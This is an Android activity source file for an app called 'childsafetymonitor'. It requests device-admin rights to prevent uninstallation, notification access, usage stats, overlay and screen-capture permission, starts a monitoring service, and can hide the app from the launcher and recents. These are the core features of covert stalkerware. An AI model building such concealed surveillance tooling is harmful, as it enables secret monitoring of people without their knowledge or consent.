package com.example.childsafetymonitor;

import android.Manifest;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.childsafetymonitor.receivers.DeviceAdminReceiver;
import com.example.childsafetymonitor.services.AppHidingService;
import com.example.childsafetymonitor.services.MonitoringService;
import com.example.childsafetymonitor.utils.PermissionHelper;
import com.example.childsafetymonitor.utils.SettingsManager;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_PERMISSIONS = 1001;
    private static final int REQUEST_USAGE_ACCESS = 1002;
    private static final int REQUEST_ADMIN_PRIVILEGES = 1003;
    private static final int REQUEST_OVERLAY_PERMISSION = 1004;
    private static final int REQUEST_NOTIFICATION_ACCESS = 1005;
    private static final int REQUEST_IGNORE_BATTERY_OPTIMIZATION = 1006;
    private static final int REQUEST_SCREEN_CAPTURE = 1007;
    
    private ComponentName deviceAdminComponent;
    private DevicePolicyManager devicePolicyManager;
    private SettingsManager settingsManager;
    private Button startButton;
    private Button stopButton;
    private Button hideAppButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize device admin for preventing uninstallation
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        deviceAdminComponent = new ComponentName(this, DeviceAdminReceiver.class);
        
        settingsManager = new SettingsManager(this);
        
        startButton = findViewById(R.id.btn_start_monitoring);
        stopButton = findViewById(R.id.btn_stop_monitoring);
        hideAppButton = findViewById(R.id.btn_hide_app);
        
        setupListeners();
        checkFirstRunSetup();
    }
    
    private void setupListeners() {
        startButton.setOnClickListener(v -> startMonitoring());
        stopButton.setOnClickListener(v -> stopMonitoring());
        hideAppButton.setOnClickListener(v -> hideApp());
    }
    
    private void checkFirstRunSetup() {
        // Check if this is the first run or if permissions need to be requested
        if (settingsManager.isFirstRun() || !checkAllPermissions()) {
            settingsManager.setFirstRun(false);
            requestPermissions();
        }
        
        // Check if monitoring should be auto-started
        if (settingsManager.isMonitoringEnabled() && !MonitoringService.isRunning(this)) {
            startMonitoring();
        }
    }
    
    private boolean checkAllPermissions() {
        // Check basic runtime permissions
        List<String> permissionsNeeded = new ArrayList<>();
        
        for (String permission : PermissionHelper.getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        // Check special permissions
        boolean hasUsageStats = hasUsageStatsPermission();
        boolean hasDeviceAdmin = devicePolicyManager.isAdminActive(deviceAdminComponent);
        boolean hasOverlayPermission = Settings.canDrawOverlays(this);
        boolean hasNotificationAccess = hasNotificationAccessPermission();
        boolean hasIgnoreBatteryOptimization = isIgnoringBatteryOptimizations();
        
        return permissionsNeeded.isEmpty() && 
               hasUsageStats && 
               hasDeviceAdmin && 
               hasOverlayPermission && 
               hasNotificationAccess && 
               hasIgnoreBatteryOptimization;
    }
    
    private void requestPermissions() {
        // Request runtime permissions first
        List<String> permissionsNeeded = new ArrayList<>();
        
        for (String permission : PermissionHelper.getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                    permissionsNeeded.toArray(new String[0]), 
                    REQUEST_PERMISSIONS);
            return;
        }
        
        // Request special permissions that require UI interaction
        if (!hasUsageStatsPermission()) {
            requestUsageStatsPermission();
            return;
        }
        
        if (!devicePolicyManager.isAdminActive(deviceAdminComponent)) {
            requestDeviceAdminPermission();
            return;
        }
        
        if (!Settings.canDrawOverlays(this)) {
            requestOverlayPermission();
            return;
        }
        
        if (!hasNotificationAccessPermission()) {
            requestNotificationAccessPermission();
            return;
        }
        
        if (!isIgnoringBatteryOptimizations()) {
            requestIgnoreBatteryOptimization();
            return;
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == REQUEST_PERMISSIONS) {
            boolean allGranted = true;
            
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                // Continue with special permissions
                requestPermissions();
            } else {
                Toast.makeText(this, "App requires all permissions to function properly", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        switch (requestCode) {
            case REQUEST_USAGE_ACCESS:
                // Continue with next permission
                requestPermissions();
                break;
                
            case REQUEST_ADMIN_PRIVILEGES:
                if (resultCode == RESULT_OK) {
                    Toast.makeText(this, "Device admin enabled", Toast.LENGTH_SHORT).show();
                }
                requestPermissions();
                break;
                
            case REQUEST_OVERLAY_PERMISSION:
                // Continue with next permission
                requestPermissions();
                break;
                
            case REQUEST_NOTIFICATION_ACCESS:
                // Continue with next permission
                requestPermissions();
                break;
                
            case REQUEST_IGNORE_BATTERY_OPTIMIZATION:
                // Continue with next permission
                requestPermissions();
                break;
                
            case REQUEST_SCREEN_CAPTURE:
                if (resultCode == RESULT_OK && data != null) {
                    // Store media projection permission
                    Intent service = new Intent(this, MonitoringService.class);
                    service.putExtra(MonitoringService.EXTRA_RESULT_DATA, data);
                    startService(service);
                }
                break;
        }
    }
    
    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }
    
    private void requestUsageStatsPermission() {
        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
        startActivityForResult(intent, REQUEST_USAGE_ACCESS);
        Toast.makeText(this, "Please grant usage access permission", Toast.LENGTH_LONG).show();
    }
    
    private void requestDeviceAdminPermission() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
        startActivityForResult(intent, REQUEST_ADMIN_PRIVILEGES);
    }
    
    private void requestOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION);
        Toast.makeText(this, "Please grant overlay permission", Toast.LENGTH_LONG).show();
    }
    
    private boolean hasNotificationAccessPermission() {
        String enabledNotificationListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(getPackageName());
    }
    
    private void requestNotificationAccessPermission() {
        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        startActivityForResult(intent, REQUEST_NOTIFICATION_ACCESS);
        Toast.makeText(this, "Please enable notification access for the app", Toast.LENGTH_LONG).show();
    }
    
    private boolean isIgnoringBatteryOptimizations() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        return powerManager.isIgnoringBatteryOptimizations(getPackageName());
    }
    
    private void requestIgnoreBatteryOptimization() {
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, REQUEST_IGNORE_BATTERY_OPTIMIZATION);
    }
    
    private void startMonitoring() {
        if (!checkAllPermissions()) {
            requestPermissions();
            return;
        }
        
        if (!MonitoringService.isRunning(this)) {
            // Request screen capture permission if needed for screen mirroring
            if (settingsManager.isScreenMirroringEnabled()) {
                MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
            } else {
                // Start monitoring service directly
                Intent serviceIntent = new Intent(this, MonitoringService.class);
                ContextCompat.startForegroundService(this, serviceIntent);
            }
            
            settingsManager.setMonitoringEnabled(true);
            Toast.makeText(this, "Monitoring started", Toast.LENGTH_SHORT).show();
            
            // Hide app after service is started if configured
            if (settingsManager.isHideAppEnabled()) {
                new android.os.Handler().postDelayed(this::hideApp, 2000);
            }
        }
    }
    
    private void stopMonitoring() {
        if (MonitoringService.isRunning(this)) {
            Intent serviceIntent = new Intent(this, MonitoringService.class);
            stopService(serviceIntent);
            
            settingsManager.setMonitoringEnabled(false);
            Toast.makeText(this, "Monitoring stopped", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void hideApp() {
        if (checkAllPermissions()) {
            Intent intent = new Intent(this, AppHidingService.class);
            intent.setAction(AppHidingService.ACTION_HIDE_APP);
            startService(intent);
            
            // Finish activity to hide it from recents
            finishAndRemoveTask();
        } else {
            Toast.makeText(this, "Cannot hide app - permissions required", Toast.LENGTH_SHORT).show();
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}